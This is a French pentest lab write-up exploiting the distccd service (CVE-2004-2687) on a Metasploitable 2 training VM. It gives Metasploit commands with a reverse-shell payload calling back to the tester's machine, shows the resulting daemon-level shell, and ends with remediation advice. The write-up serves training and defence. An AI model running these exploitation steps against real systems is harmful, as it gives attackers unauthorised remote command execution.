distccd — Exécution de commande

Démon de compilation distribuée exposé sans contrôle d'accès

Service / Portdistccd — port 3632
CibleMetasploitable 2 — 192.168.56.101
CVECVE-2004-2687
RésultatShell daemon (uid=1, accès système sans élévation)
Testé parZANNOU Josaphat

1. Identification

distcc répartit la compilation de code source sur plusieurs machines. Le démon distccd ne vérifie pas l'identité des clients qui lui envoient du travail : exposé sur le réseau sans restreindre les hôtes autorisés, il exécute les commandes de compilation qu'on lui soumet — ce qui permet d'y glisser une commande shell arbitraire. Le scan de reconnaissance confirme le service ouvert sur le port 3632.

2. Méthode d'identification de la CVE et du module

Première question : ce service a-t-il une faille connue ?

$ searchsploit distcc

---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
DistCC Daemon - Command Execution (Metasploit) | multiple/remote/9915.rb
---------------------------------------------- ---------------------------------

Une exécution de commande connue existe. Le chemin du module dans msfconsole :

$ msfconsole -q -x "search distcc; exit"

#  Full Name                      Disclosure Date  Rank       Check  Name
-  ---------                      ---------------  ----       -----  ----
0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution

Puis la CVE et le mécanisme :

$ msfconsole -q -x "info exploit/unix/misc/distcc_exec; exit"

References:
  https://nvd.nist.gov/vuln/detail/CVE-2004-2687

La section References confirme CVE-2004-2687. Ce n'est pas une faille de code mais une mauvaise configuration par défaut : le démon accepte des connexions de n'importe quel hôte et exécute les ordres de compilation reçus, ce qui ouvre la porte à l'exécution de commande à distance (RCE).

distccd exposé sans restreindre les clients autorisés — n'importe quel hôte peut lui faire exécuter une commande shell, avec les droits du compte de service daemon.

3. Démarche d'exploitation

Démarche interactive dans msfconsole, commande par commande :

msf6 > use exploit/unix/misc/distcc_exec
msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf6 exploit(unix/misc/distcc_exec) > set RPORT 3632
RPORT => 3632
msf6 exploit(unix/misc/distcc_exec) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
msf6 exploit(unix/misc/distcc_exec) > set LPORT 4445
LPORT => 4445
msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse

Point d'attention — LHOST/LPORT sont nécessaires car cmd/unix/reverse est un payload reverse. Ce payload particulier établit en fait deux connexions retour vers l'attaquant (« double reverse » shell) — on voit donc deux sockets établis sur le port 4445, c'est son fonctionnement normal.

4. Preuve d'accès obtenu

run -z déclenche l'attaque et ouvre la session en arrière-plan ; sessions -c "..." -i 1 exécute les commandes de preuve dans la session :

msf6 exploit(unix/misc/distcc_exec) > run -z
[*] Command shell session 1 opened (192.168.56.1:4445 -> 192.168.56.101:56190)
msf6 exploit(unix/misc/distcc_exec) > sessions -c "id; uname -a; hostname; whoami" -i 1
[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable
daemon

L'accès obtenu est celui du compte de service daemon (uid=1), pas root : le démon distccd tourne sous ce compte, donc la commande injectée hérite de ses droits. On est néanmoins entré sur la machine — ce shell est un point de départ pour une élévation de privilèges ultérieure (noyau 2.6.24 ancien, recherche de binaires SUID ou de fichiers world-writable).

5. Remédiation

RECOMMANDATIONS
  • Restreindre les clients autorisés du démon avec l'option --allow (liste blanche d'adresses/réseaux de confiance), au lieu de l'exposer à tous.
  • Ne jamais exposer distccd sur un réseau non maîtrisé ; le réserver à un réseau de compilation isolé, derrière un pare-feu.
  • Appliquer le moindre privilège : le démon tourne déjà sous daemon et non root, ce qui limite l'impact — à maintenir, et compléter par un durcissement système pour empêcher l'élévation de privilèges depuis ce compte.
  • Désactiver le service s'il n'est pas réellement utilisé.
